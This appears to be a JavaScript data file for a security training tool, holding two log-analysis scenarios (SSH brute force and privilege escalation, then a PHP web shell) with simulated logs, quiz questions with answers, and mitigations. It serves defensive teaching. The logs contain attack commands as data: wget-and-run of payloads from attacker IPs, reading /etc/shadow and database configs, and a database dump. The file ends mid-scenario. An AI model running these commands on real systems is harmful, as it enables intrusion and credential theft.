// =============================================================================
// LogSight - Cybersecurity Scenarios for Learn Mode
// =============================================================================
// Each scenario contains embedded log data, investigation questions with
// answers, and a full intelligence report with framework mappings.
// =============================================================================

var SCENARIOS = {

  // ===========================================================================
  // SCENARIO 1: SSH Brute Force -> Privilege Escalation
  // ===========================================================================
  'ssh-bruteforce': {
    title: 'SSH Brute Force & Privilege Escalation',
    difficulty: 2,
    logSource: 'auth.log',
    mitreTags: 'T1110.001, T1078, T1053.003, T1021.004, T1059.004',
    description: 'An attacker launched a brute-force attack against an SSH server, eventually gaining access with a weak password. After establishing a foothold, the attacker escalated privileges and installed a persistent backdoor. Analyze the authentication logs to trace the full attack chain from initial reconnaissance to post-exploitation activity.',

    logs: [
      // Normal activity baseline
      'Jun 14 08:00:01 web-prod-01 CRON[2841]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 14 08:00:01 web-prod-01 CRON[2841]: pam_unix(cron:session): session closed for user root',
      'Jun 14 08:02:17 web-prod-01 sshd[2903]: Accepted publickey for deploy from 10.0.1.50 port 52314 ssh2: RSA SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8',
      'Jun 14 08:02:17 web-prod-01 sshd[2903]: pam_unix(sshd:session): session opened for user deploy by (uid=0)',
      'Jun 14 08:05:01 web-prod-01 CRON[2950]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 14 08:05:01 web-prod-01 CRON[2950]: pam_unix(cron:session): session closed for user root',
      'Jun 14 08:07:33 web-prod-01 sshd[2903]: pam_unix(sshd:session): session closed for user deploy',

      // Brute force begins - rapid failed attempts from attacker IP
      'Jun 14 08:12:44 web-prod-01 sshd[3101]: Invalid user root from 45.33.32.156 port 44120',
      'Jun 14 08:12:44 web-prod-01 sshd[3101]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=root',
      'Jun 14 08:12:46 web-prod-01 sshd[3101]: Failed password for root from 45.33.32.156 port 44120 ssh2',
      'Jun 14 08:12:47 web-prod-01 sshd[3103]: Invalid user root from 45.33.32.156 port 44122',
      'Jun 14 08:12:49 web-prod-01 sshd[3103]: Failed password for root from 45.33.32.156 port 44122 ssh2',
      'Jun 14 08:12:50 web-prod-01 sshd[3105]: Invalid user root from 45.33.32.156 port 44124',
      'Jun 14 08:12:52 web-prod-01 sshd[3105]: Failed password for root from 45.33.32.156 port 44124 ssh2',
      'Jun 14 08:12:53 web-prod-01 sshd[3107]: Invalid user root from 45.33.32.156 port 44126',
      'Jun 14 08:12:55 web-prod-01 sshd[3107]: Failed password for root from 45.33.32.156 port 44126 ssh2',
      'Jun 14 08:12:56 web-prod-01 sshd[3109]: Invalid user root from 45.33.32.156 port 44128',
      'Jun 14 08:12:58 web-prod-01 sshd[3109]: Failed password for root from 45.33.32.156 port 44128 ssh2',
      'Jun 14 08:12:59 web-prod-01 sshd[3111]: Invalid user root from 45.33.32.156 port 44130',
      'Jun 14 08:13:01 web-prod-01 sshd[3111]: Failed password for root from 45.33.32.156 port 44130 ssh2',
      'Jun 14 08:13:02 web-prod-01 sshd[3113]: Invalid user root from 45.33.32.156 port 44132',
      'Jun 14 08:13:04 web-prod-01 sshd[3113]: Failed password for root from 45.33.32.156 port 44132 ssh2',
      'Jun 14 08:13:05 web-prod-01 sshd[3115]: Invalid user root from 45.33.32.156 port 44134',
      'Jun 14 08:13:07 web-prod-01 sshd[3115]: Failed password for root from 45.33.32.156 port 44134 ssh2',
      'Jun 14 08:13:08 web-prod-01 sshd[3117]: Invalid user root from 45.33.32.156 port 44136',
      'Jun 14 08:13:10 web-prod-01 sshd[3117]: Failed password for root from 45.33.32.156 port 44136 ssh2',

      // Switch to admin username
      'Jun 14 08:13:12 web-prod-01 sshd[3119]: Invalid user admin from 45.33.32.156 port 44138',
      'Jun 14 08:13:12 web-prod-01 sshd[3119]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=admin',
      'Jun 14 08:13:14 web-prod-01 sshd[3119]: Failed password for admin from 45.33.32.156 port 44138 ssh2',
      'Jun 14 08:13:15 web-prod-01 sshd[3121]: Invalid user admin from 45.33.32.156 port 44140',
      'Jun 14 08:13:17 web-prod-01 sshd[3121]: Failed password for admin from 45.33.32.156 port 44140 ssh2',
      'Jun 14 08:13:18 web-prod-01 sshd[3123]: Invalid user admin from 45.33.32.156 port 44142',
      'Jun 14 08:13:20 web-prod-01 sshd[3123]: Failed password for admin from 45.33.32.156 port 44142 ssh2',
      'Jun 14 08:13:21 web-prod-01 sshd[3125]: Invalid user admin from 45.33.32.156 port 44144',
      'Jun 14 08:13:23 web-prod-01 sshd[3125]: Failed password for admin from 45.33.32.156 port 44144 ssh2',
      'Jun 14 08:13:24 web-prod-01 sshd[3127]: Invalid user admin from 45.33.32.156 port 44146',
      'Jun 14 08:13:26 web-prod-01 sshd[3127]: Failed password for admin from 45.33.32.156 port 44146 ssh2',
      'Jun 14 08:13:27 web-prod-01 sshd[3129]: Invalid user admin from 45.33.32.156 port 44148',
      'Jun 14 08:13:29 web-prod-01 sshd[3129]: Failed password for admin from 45.33.32.156 port 44148 ssh2',
      'Jun 14 08:13:30 web-prod-01 sshd[3131]: Invalid user admin from 45.33.32.156 port 44150',
      'Jun 14 08:13:32 web-prod-01 sshd[3131]: Failed password for admin from 45.33.32.156 port 44150 ssh2',
      'Jun 14 08:13:33 web-prod-01 sshd[3133]: Invalid user admin from 45.33.32.156 port 44152',
      'Jun 14 08:13:35 web-prod-01 sshd[3133]: Failed password for admin from 45.33.32.156 port 44152 ssh2',
      'Jun 14 08:13:36 web-prod-01 sshd[3135]: Invalid user admin from 45.33.32.156 port 44154',
      'Jun 14 08:13:38 web-prod-01 sshd[3135]: Failed password for admin from 45.33.32.156 port 44154 ssh2',
      'Jun 14 08:13:39 web-prod-01 sshd[3137]: Invalid user admin from 45.33.32.156 port 44156',
      'Jun 14 08:13:41 web-prod-01 sshd[3137]: Failed password for admin from 45.33.32.156 port 44156 ssh2',

      // Interleaved normal CRON activity
      'Jun 14 08:14:01 web-prod-01 CRON[3140]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 14 08:14:01 web-prod-01 CRON[3140]: pam_unix(cron:session): session closed for user root',

      // More brute force - trying "test" user
      'Jun 14 08:14:03 web-prod-01 sshd[3142]: Invalid user test from 45.33.32.156 port 44158',
      'Jun 14 08:14:03 web-prod-01 sshd[3142]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=test',
      'Jun 14 08:14:05 web-prod-01 sshd[3142]: Failed password for test from 45.33.32.156 port 44158 ssh2',
      'Jun 14 08:14:06 web-prod-01 sshd[3144]: Invalid user test from 45.33.32.156 port 44160',
      'Jun 14 08:14:08 web-prod-01 sshd[3144]: Failed password for test from 45.33.32.156 port 44160 ssh2',
      'Jun 14 08:14:09 web-prod-01 sshd[3146]: Invalid user test from 45.33.32.156 port 44162',
      'Jun 14 08:14:11 web-prod-01 sshd[3146]: Failed password for test from 45.33.32.156 port 44162 ssh2',
      'Jun 14 08:14:12 web-prod-01 sshd[3148]: Invalid user test from 45.33.32.156 port 44164',
      'Jun 14 08:14:14 web-prod-01 sshd[3148]: Failed password for test from 45.33.32.156 port 44164 ssh2',
      'Jun 14 08:14:15 web-prod-01 sshd[3150]: Invalid user test from 45.33.32.156 port 44166',
      'Jun 14 08:14:17 web-prod-01 sshd[3150]: Failed password for test from 45.33.32.156 port 44166 ssh2',
      'Jun 14 08:14:18 web-prod-01 sshd[3152]: Invalid user test from 45.33.32.156 port 44168',
      'Jun 14 08:14:20 web-prod-01 sshd[3152]: Failed password for test from 45.33.32.156 port 44168 ssh2',
      'Jun 14 08:14:21 web-prod-01 sshd[3154]: Invalid user test from 45.33.32.156 port 44170',
      'Jun 14 08:14:23 web-prod-01 sshd[3154]: Failed password for test from 45.33.32.156 port 44170 ssh2',
      'Jun 14 08:14:24 web-prod-01 sshd[3156]: Invalid user test from 45.33.32.156 port 44172',
      'Jun 14 08:14:26 web-prod-01 sshd[3156]: Failed password for test from 45.33.32.156 port 44172 ssh2',
      'Jun 14 08:14:27 web-prod-01 sshd[3158]: Invalid user test from 45.33.32.156 port 44174',
      'Jun 14 08:14:29 web-prod-01 sshd[3158]: Failed password for test from 45.33.32.156 port 44174 ssh2',
      'Jun 14 08:14:30 web-prod-01 sshd[3160]: Invalid user test from 45.33.32.156 port 44176',
      'Jun 14 08:14:32 web-prod-01 sshd[3160]: Failed password for test from 45.33.32.156 port 44176 ssh2',

      // Unrelated login attempt from different IP
      'Jun 14 08:14:45 web-prod-01 sshd[3165]: Failed password for root from 185.220.101.42 port 39201 ssh2',
      'Jun 14 08:14:47 web-prod-01 sshd[3167]: Failed password for root from 185.220.101.42 port 39203 ssh2',
      'Jun 14 08:14:50 web-prod-01 sshd[3169]: Failed password for root from 185.220.101.42 port 39205 ssh2',

      // Back to attacker - more admin attempts with different passwords
      'Jun 14 08:14:55 web-prod-01 sshd[3171]: Invalid user admin from 45.33.32.156 port 44178',
      'Jun 14 08:14:57 web-prod-01 sshd[3171]: Failed password for admin from 45.33.32.156 port 44178 ssh2',
      'Jun 14 08:14:58 web-prod-01 sshd[3173]: Invalid user admin from 45.33.32.156 port 44180',
      'Jun 14 08:15:00 web-prod-01 sshd[3173]: Failed password for admin from 45.33.32.156 port 44180 ssh2',
      'Jun 14 08:15:01 web-prod-01 sshd[3175]: Invalid user admin from 45.33.32.156 port 44182',
      'Jun 14 08:15:03 web-prod-01 sshd[3175]: Failed password for admin from 45.33.32.156 port 44182 ssh2',
      'Jun 14 08:15:04 web-prod-01 sshd[3177]: Invalid user admin from 45.33.32.156 port 44184',
      'Jun 14 08:15:06 web-prod-01 sshd[3177]: Failed password for admin from 45.33.32.156 port 44184 ssh2',
      'Jun 14 08:15:07 web-prod-01 sshd[3179]: Invalid user admin from 45.33.32.156 port 44186',
      'Jun 14 08:15:09 web-prod-01 sshd[3179]: Failed password for admin from 45.33.32.156 port 44186 ssh2',

      // CRON noise
      'Jun 14 08:15:01 web-prod-01 CRON[3180]: pam_unix(cron:session): session opened for user www-data by (uid=0)',
      'Jun 14 08:15:01 web-prod-01 CRON[3180]: pam_unix(cron:session): session closed for user www-data',

      // Successful login after brute force
      'Jun 14 08:15:22 web-prod-01 sshd[3190]: Accepted password for admin from 45.33.32.156 port 44188 ssh2',
      'Jun 14 08:15:22 web-prod-01 sshd[3190]: pam_unix(sshd:session): session opened for user admin by (uid=0)',
      'Jun 14 08:15:23 web-prod-01 systemd-logind[612]: New session 47 of user admin.',

      // Post-exploitation: privilege escalation and payload delivery
      'Jun 14 08:15:38 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow',
      'Jun 14 08:15:45 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://45.33.32.156:8080/shell.sh -O /tmp/shell.sh',
      'Jun 14 08:15:52 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod +x /tmp/shell.sh',
      'Jun 14 08:15:58 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/tmp/shell.sh',
      'Jun 14 08:16:05 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/crontab -e',
      'Jun 14 08:16:12 web-prod-01 CRON[3210]: (root) RELOAD (crontabs/root)',

      // Another unrelated IP attempt
      'Jun 14 08:16:30 web-prod-01 sshd[3215]: Failed password for root from 192.168.1.105 port 50122 ssh2',
      'Jun 14 08:16:33 web-prod-01 sshd[3217]: Accepted publickey for deploy from 10.0.1.50 port 52480 ssh2',
      'Jun 14 08:16:33 web-prod-01 sshd[3217]: pam_unix(sshd:session): session opened for user deploy by (uid=0)',

      // Normal CRON
      'Jun 14 08:20:01 web-prod-01 CRON[3230]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 14 08:20:01 web-prod-01 CRON[3230]: pam_unix(cron:session): session closed for user root',
      'Jun 14 08:25:01 web-prod-01 CRON[3245]: pam_unix(cron:session): session opened for user root by (uid=0)',
      'Jun 14 08:25:01 web-prod-01 CRON[3245]: pam_unix(cron:session): session closed for user root'
    ],

    questions: [
      {
        q: 'What is the IP address of the primary attacker conducting the brute-force attack?',
        a: '45.33.32.156',
        hint: 'Look for the source IP that repeats across dozens of "Failed password" lines in a short window.',
        evidence: 'Lines 9–73: every "Failed password for ... from 45.33.32.156" originates from this single IP within ~3 minutes.'
      },
      {
        q: 'How many failed password attempts originated from the attacker IP?',
        a: '50',
        hint: 'Filter the log for "Failed password" and count the entries from the attacker IP.',
        evidence: 'Filtering "Failed password.*45.33.32.156" yields 50 attempts before the first "Accepted password".'
      },
      {
        q: 'Which user account was ultimately compromised?',
        a: 'admin',
        hint: 'Find the "Accepted password" line — the user on that line is the one that succeeded.',
        evidence: 'Line ~74: "Accepted password for admin from 45.33.32.156" — admin is the compromised account.'
      },
      {
        q: 'What file was downloaded to the server after the attacker gained access?',
        a: 'shell.sh (downloaded via wget from http://45.33.32.156:8080/shell.sh to /tmp/shell.sh)',
        hint: 'After the successful login, look for a sudo command that fetches a remote file (wget/curl).',
        evidence: 'sudo line: "wget http://45.33.32.156:8080/shell.sh -O /tmp/shell.sh" — the dropped payload is shell.sh.'
      },
      {
        q: 'What sensitive file did the attacker read using sudo?',
        a: '/etc/shadow',
        hint: 'Check the sudo COMMAND entries for access to a file that stores password hashes.',
        evidence: 'sudo line: "COMMAND=/bin/cat /etc/shadow" — the attacker harvested the password hash file.'
      },
      {
        q: 'What persistence mechanism did the attacker install?',
        a: 'A cron job (crontab -e followed by CRON RELOAD confirms a new cron entry was added)',
        hint: 'Persistence here survives reboots — look for a scheduled-task / crontab modification.',
        evidence: 'A "crontab" edit followed by "CRON ... RELOAD" confirms a new cron entry was added for persistence.'
      }
    ],

    intel: {
      ioc: [
        '45.33.32.156 (attacker source IP)',
        '185.220.101.42 (secondary scanning IP)',
        'http://45.33.32.156:8080/shell.sh (malicious payload URL)',
        '/tmp/shell.sh (dropped payload)',
        'SHA256 of /etc/shadow read (credential harvesting indicator)'
      ],
      risk: [
        'Weak SSH password on admin account enabled brute-force success',
        'sudo access allowed immediate privilege escalation',
        'No rate limiting or fail2ban on SSH service',
        'Outbound HTTP to attacker IP not blocked by firewall',
        'Cron-based persistence may survive remediation if not removed'
      ],
      attackSteps: [
        { phase: 'Reconnaissance', detail: 'Attacker enumerated common usernames (root, admin, test) via SSH login attempts', mitre: ['T1110.001'] },
        { phase: 'Initial Access', detail: 'Brute-forced SSH password for admin account after ~50 attempts over 3 minutes', mitre: ['T1110.001', 'T1078'] },
        { phase: 'Lateral Movement', detail: 'Authenticated over SSH using the compromised valid account', mitre: ['T1021.004'] },
        { phase: 'Execution', detail: 'Downloaded and executed shell.sh reverse shell payload from attacker-controlled server', mitre: ['T1059.004'] },
        { phase: 'Persistence', detail: 'Created cron job to maintain access across reboots', mitre: ['T1053.003'] }
      ],
      mitigation: [
        'Disable password authentication for SSH; require key-based auth only',
        'Deploy fail2ban or similar rate-limiting tool on SSH',
        'Remove admin user from sudoers or require multi-factor for sudo',
        'Implement egress filtering to block outbound connections to unknown IPs',
        'Monitor cron job changes with auditd rules',
        'Enforce strong password policy with minimum 16-character requirement',
        'Restrict SSH access to specific IP ranges via firewall rules'
      ],
      frameworks: {
        mitre: [
          { id: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'Credential Access' },
          { id: 'T1078', name: 'Valid Accounts', tactic: 'Persistence, Defense Evasion, Initial Access' },
          { id: 'T1053.003', name: 'Scheduled Task/Job: Cron', tactic: 'Persistence, Execution' },
          { id: 'T1021.004', name: 'Remote Services: SSH', tactic: 'Lateral Movement' },
          { id: 'T1059.004', name: 'Command and Scripting Interpreter: Unix Shell', tactic: 'Execution' }
        ],
        nist: [
          'PR.AC-1: Identities and credentials are issued, managed, verified, revoked, and audited',
          'PR.AC-7: Users, devices, and other assets are authenticated commensurate with risk',
          'DE.CM-1: The network is monitored to detect potential cybersecurity events',
          'DE.AE-2: Detected events are analyzed to understand attack targets and methods',
          'RS.MI-2: Incidents are mitigated'
        ],
        owasp: [
          'A07:2021 - Identification and Authentication Failures'
        ],
        cvss: {
          score: 8.1,
          vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
          severity: 'High'
        }
      }
    }
  },

  // ===========================================================================
  // SCENARIO 2: Web Shell Upload & Execution
  // ===========================================================================
  'web-shell': {
    title: 'Web Shell Upload & Execution',
    difficulty: 3,
    logSource: 'access.log + syslog',
    mitreTags: 'T1505.003, T1059.004, T1083, T1190',
    description: 'An attacker discovered a file upload vulnerability on a web application and exploited it to upload a PHP web shell. Through the web shell, the attacker executed system commands to enumerate the server, read sensitive files, and establish command-and-control communication. Analyze the combined Apache access logs and system logs to reconstruct the attack.',

    logs: [
      // Normal web traffic baseline
      '203.0.113.10 - - [14/Jun/2026:09:00:12 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '203.0.113.10 - - [14/Jun/2026:09:00:13 +0000] "GET /css/style.css HTTP/1.1" 200 4521 "http://webapp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '203.0.113.10 - - [14/Jun/2026:09:00:13 +0000] "GET /js/app.js HTTP/1.1" 200 8910 "http://webapp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '203.0.113.10 - - [14/Jun/2026:09:00:14 +0000] "GET /images/logo.png HTTP/1.1" 304 0 "http://webapp.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '198.51.100.25 - - [14/Jun/2026:09:01:05 +0000] "GET /about HTTP/1.1" 200 8432 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
      '198.51.100.25 - - [14/Jun/2026:09:01:06 +0000] "GET /css/style.css HTTP/1.1" 304 0 "http://webapp.local/about" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
      '172.16.0.88 - - [14/Jun/2026:09:02:30 +0000] "GET /api/products HTTP/1.1" 200 12044 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"',
      '172.16.0.88 - - [14/Jun/2026:09:02:31 +0000] "GET /api/products/42 HTTP/1.1" 200 1523 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"',

      // Attacker reconnaissance
      '91.189.91.38 - - [14/Jun/2026:09:10:44 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
      '91.189.91.38 - - [14/Jun/2026:09:10:51 +0000] "GET /robots.txt HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:11:02 +0000] "GET /sitemap.xml HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:11:15 +0000] "GET /admin HTTP/1.1" 403 287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:11:23 +0000] "GET /wp-admin HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:11:30 +0000] "GET /administrator HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:11:38 +0000] "GET /upload HTTP/1.1" 200 3241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:11:45 +0000] "GET /upload.php HTTP/1.1" 200 3241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',

      // More normal traffic interleaved
      '203.0.113.10 - - [14/Jun/2026:09:12:00 +0000] "GET /products HTTP/1.1" 200 9876 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '198.51.100.25 - - [14/Jun/2026:09:12:15 +0000] "GET /contact HTTP/1.1" 200 5432 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
      '172.16.0.88 - - [14/Jun/2026:09:12:30 +0000] "POST /api/cart HTTP/1.1" 201 256 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"',

      // Web shell upload
      '91.189.91.38 - - [14/Jun/2026:09:13:02 +0000] "POST /upload.php HTTP/1.1" 200 87 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:13:05 +0000] "GET /uploads/shell.php HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',

      // Web shell command execution
      '91.189.91.38 - - [14/Jun/2026:09:13:15 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:13:22 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 52 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:13:30 +0000] "GET /uploads/shell.php?cmd=uname+-a HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:13:38 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1847 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:13:45 +0000] "GET /uploads/shell.php?cmd=ls+-la+/var/www HTTP/1.1" 200 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:13:52 +0000] "GET /uploads/shell.php?cmd=cat+/var/www/html/config/db.php HTTP/1.1" 200 342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:14:01 +0000] "GET /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:14:10 +0000] "GET /uploads/shell.php?cmd=netstat+-tlnp HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:14:18 +0000] "GET /uploads/shell.php?cmd=wget+http://91.189.91.38:4444/backdoor+-O+/tmp/.bd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:14:25 +0000] "GET /uploads/shell.php?cmd=chmod+%2bx+/tmp/.bd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:14:33 +0000] "GET /uploads/shell.php?cmd=nohup+/tmp/.bd+%26 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',

      // Corresponding syslog entries
      'Jun 14 09:13:15 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: whoami',
      'Jun 14 09:13:22 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: id',
      'Jun 14 09:13:30 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: uname -a',
      'Jun 14 09:13:38 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: cat /etc/passwd',
      'Jun 14 09:13:45 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: ls -la /var/www',
      'Jun 14 09:13:52 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: cat /var/www/html/config/db.php',
      'Jun 14 09:14:01 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: cat /etc/shadow (permission denied)',
      'Jun 14 09:14:10 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: netstat -tlnp',
      'Jun 14 09:14:18 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: wget http://91.189.91.38:4444/backdoor -O /tmp/.bd',
      'Jun 14 09:14:25 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: chmod +x /tmp/.bd',
      'Jun 14 09:14:33 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: nohup /tmp/.bd &',
      'Jun 14 09:14:34 webapp-srv kernel: [84521.332] TCP: www-data established outbound connection to 91.189.91.38:4444',

      // More normal traffic continuing
      '203.0.113.10 - - [14/Jun/2026:09:15:00 +0000] "GET /products/15 HTTP/1.1" 200 4312 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '198.51.100.25 - - [14/Jun/2026:09:15:22 +0000] "POST /contact HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
      '172.16.0.88 - - [14/Jun/2026:09:15:45 +0000] "GET /api/cart HTTP/1.1" 200 856 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)"',
      '203.0.113.10 - - [14/Jun/2026:09:16:01 +0000] "GET /checkout HTTP/1.1" 200 7654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',

      // Continued web shell activity
      '91.189.91.38 - - [14/Jun/2026:09:18:05 +0000] "GET /uploads/shell.php?cmd=find+/+-name+*.sql+-type+f HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      '91.189.91.38 - - [14/Jun/2026:09:18:20 +0000] "GET /uploads/shell.php?cmd=mysqldump+-u+root+-pdbpass123+webapp+>+/tmp/dump.sql HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
      'Jun 14 09:18:05 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: find / -name *.sql -type f',
      'Jun 14 09:18:20 webapp-srv syslog: apache2[4521]: mod_php: shell execution by www-data: mysqldump -u root -pdbpass123 webapp > /tmp/dump.sql',

      // More normal traffic
      '198.51.100.25 - - [14/Jun/2026:09:20:00 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
      '203.0.113.10 - - [14/Jun/2026:09:20:15 +0000] "GET /api/orders HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'
    ],

    questions: [
      {
        q: 'What is the IP address of the attacker who uploaded the web shell?',
        a: '91.189.91.38',
        hint: 'Find the POST request that uploads a file, then the IP that keeps accessing it with ?cmd= parameters.',
        evidence: 'The upload POST and all subsequent /uploads/shell.php?cmd= requests originate from 91.189.91.38.'
      },
      {
        q: 'What is the filename of the uploaded web shell?',
        a: 'shell.php (uploaded to /uploads/shell.php)',
        hint: 'Look for a POST to an upload endpoint followed by GETs of a new .php file under /uploads.',
        evidence: 'After the POST upload, the attacker repeatedly requests /uploads/shell.php?cmd=... — the web shell.'
      },
      {
        q: 'What was the first command executed through the web shell?',
        a: 'whoami',
        hint: 'Check the cmd= parameter on the first request to the shell.',
        evidence: 'The first /uploads/shell.php?cmd=whoami establishes which user the web server runs as.'
      },
      {
        q: 'Which sensitive configuration file did the attacker read successfully?',
        a: '/var/www/html/config/db.php (database configuration with credentials)',
        hint: 'Look for a cmd=cat request targeting an application config file that returns 200.',
        evidence: 'cmd=cat /var/www/html/config/db.php returned 200 — exposing database credentials.'
      },
      {
        q: 'What was the attacker unable to read due to permissions?',
        a: '/etc/shadow (permission denied for www-data user)',
        hint: 'One cat command returns an error / permission-denied because www-data lacks rights.',
        evidence: 'cmd=cat /etc/shadow failed (permission denied) — www-data cannot read the shadow file.'
      },
      {
        q: 'What C2 callback did the attacker establish?',
        a: 'Downloaded backdoor from http://91.189.91.38:4444/backdoor to /tmp/.bd and executed it, establishing outbound TCP connection to 91.189.91.38:4444',
        hint: 'After recon, look for a command that downloads and runs a file, plus an outbound connection.',
        evidence: 'wget of http://91.189.91.38:4444/backdoor to /tmp/.bd, executed, then an outbound TCP connect to 91.189.91.38:4444.'
      }
    ],

    intel: {
      ioc: [
        '91.189.91.38 (attacker IP)',
        '/uploads/shell.php (web shell path)',
        'http://91.189.91.38:4444/backdoor (C2 payload URL)',
        '/tmp/.bd (dropped backdoor binary)',
        '/tmp/dump.sql (exfiltrated database dump)',
        'dbpass123 (exposed database password)'
      ],
      risk: [
        'Unrestricted file upload allows arbitrary PHP execution',
        'Upload directory is web-accessible and allows script execution',
        'Database credentials stored in plaintext config file',
        'No WAF or input validation on upload endpoint',
        'Outbound connections from web server not restricted',
        'www-data user has excessive filesystem read permissions'
      ],
      attackSteps: [
        { phase: 'Reconnaissance', detail: 'Directory enumeration to discover /upload.php endpoint and admin panels', mitre: ['T1190'] },
        { phase: 'Initial Access', detail: 'Exploited unrestricted file upload to place PHP web shell at /uploads/shell.php', mitre: ['T1505.003'] },
        { phase: 'Execution', detail: 'Executed OS commands via web shell cmd parameter (whoami, id, uname, cat)', mitre: ['T1059.004'] },
        { phase: 'Discovery', detail: 'Enumerated system info, users (/etc/passwd), network connections, and file system', mitre: ['T1083'] },
        { phase: 'Credential Access', detail: 'Read database config file containing plaintext MySQL credentials', mitre: ['T1552.001'] },
